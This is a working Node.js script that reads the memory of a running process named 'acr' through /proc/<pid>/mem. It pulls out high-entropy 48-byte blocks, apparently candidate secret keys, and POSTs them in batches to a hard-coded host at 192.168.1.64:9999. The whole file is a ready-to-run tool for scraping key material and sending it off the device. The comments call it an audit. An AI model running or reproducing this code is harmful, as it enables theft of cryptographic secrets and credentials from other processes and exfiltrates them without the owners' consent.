"use strict";
// audit121.js - broad entropy scan: extract all high-entropy 48-byte blocks from acr memory.
// POST them as candidates for PC-side verification.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 60000 }).slice(0, cap || 1000000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (!pid) {
    out.status = "NO_ACR";
    post("/p121_diag", out);
    post("/p121_done", { started: out.started });
} else {
    // dump memory if not already done
    out.dump = sh("if [ ! -f /tmp/acr_mem.bin ] || [ $(wc -c < /tmp/acr_mem.bin) -lt 1000000 ]; then cat /proc/" + pid + "/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.amap; > /tmp/acr_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); dd if=/proc/" + pid + "/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/acr_mem.bin; done < /tmp/.amap; fi; wc -c /tmp/acr_mem.bin", 1500);

    // extract all 48-byte blocks, filter by entropy
    // use dd to read 48 bytes at each 48-byte boundary, check entropy
    // high entropy = at least 20 unique bytes in 48
    out.scan = sh("dd if=/tmp/acr_mem.bin bs=48 count=100000 2>/dev/null | od -A n -t x1 | awk 'BEGIN{n=0} {if(NF>=48) {delete u; for(i=1;i<=48;i++) u[$i]=1; c=0; for(k in u) c++; if(c>=20) {printf \"%06d \", n*48; for(i=1;i<=48;i++) printf \"%s\", $i; print \"\"; n++}}}' | head -2000", 200000);

    var lines = trim(out.scan).split("\n").filter(function(x) { return x.trim().length > 50; });
    out.high_entropy_count = lines.length;

    // parse and POST candidates
    var candidates = [];
    for (var i = 0; i < lines.length; i++) {
        var parts = lines[i].trim().split(" ");
        if (parts.length >= 2) {
            var off = parseInt(parts[0]);
            var ms = parts[1];
            if (ms && ms.length == 96) {
                candidates.push({ off: off, ms: ms });
            }
        }
    }
    out.candidates_posted = candidates.length;

    // POST in batches
    for (var b = 0; b < candidates.length; b += 100) {
        post("/p121_batch", { batch: Math.floor(b/100), candidates: candidates.slice(b, b+100) });
    }

    post("/p121_done", { started: out.started, total: candidates.length });
}
